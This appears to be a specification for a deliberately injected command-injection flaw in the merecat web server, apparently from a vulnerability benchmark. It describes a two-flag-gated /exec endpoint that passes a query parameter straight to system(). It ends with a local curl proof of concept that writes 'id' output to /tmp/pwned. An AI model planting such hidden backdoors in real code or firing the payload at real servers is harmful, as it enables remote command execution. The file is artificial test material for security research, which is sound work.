DESCRIPTION:
  Two-flag-gated command injection. Both --exec-mode and --exec-logging must
  be supplied for the vulnerable endpoint to be reachable. A user-supplied URL
  query parameter flows directly into system() with no sanitization.

CONFIG_GATE (C2 — medium):
  mechanism:  two CLI flags stored in struct exec_cfg { int enabled; int logging; }
  check:      two-condition guard: `if (exec_cfg.enabled && exec_cfg.logging &&
              strncmp(hc->encodedurl, "/exec", 5) == 0 ...)`
  complexity: two conditions, two flags, struct, no utility function

INPUT_FLOW (I1 — direct):
  entry:      HTTP GET /exec?cmd=<payload>  →  hc->query (set during parsing)
  path:       httpd_start_request() dispatches to handle_exec()
              handle_exec() extracts substring after "cmd=" via strncmp/pointer
              the raw query string is passed directly to system()
  transforms: none — no urldecode(), no snprintf() buffering, no copy

SANITIZATION (S1 — none):
  none

SINK:        system() in handle_exec() (src/libhttpd.c, injected before httpd_start_request)

CHANGED FILES:
  src/merecat.c — 3 hunks:
    1. global:          added `struct { int enabled; int logging; } exec_cfg`
    2. usage():         added --exec-mode, --exec-logging entries in usage printf block
    3. main():          pre-scan loop compacts both exec flags out of argv before getopt

  src/libhttpd.c — 2 hunks:
    1. extern decl:     added extern struct declaration for exec_cfg
    2. handle_exec():   new function; I1/S1 implementation (direct system())
    3. httpd_start_request(): two-condition exec route guard at top of function

EXPLOIT:
  build:   bash build.sh
  start:   ./merecat -n -p 18058 /tmp/www --exec-mode --exec-logging
  trigger: curl 'http://127.0.0.1:18058/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting either flag (e.g. only --exec-mode) causes /exec to
               return 404 since exec_cfg.logging == 0.

NOTES:
  - system() output goes to server stdout/stderr, not the HTTP response body.
    Use write-to-file payloads (id>/tmp/pwned) to confirm blind execution.
  - The server runs in foreground mode (-n) to avoid daemonization for PoC use.
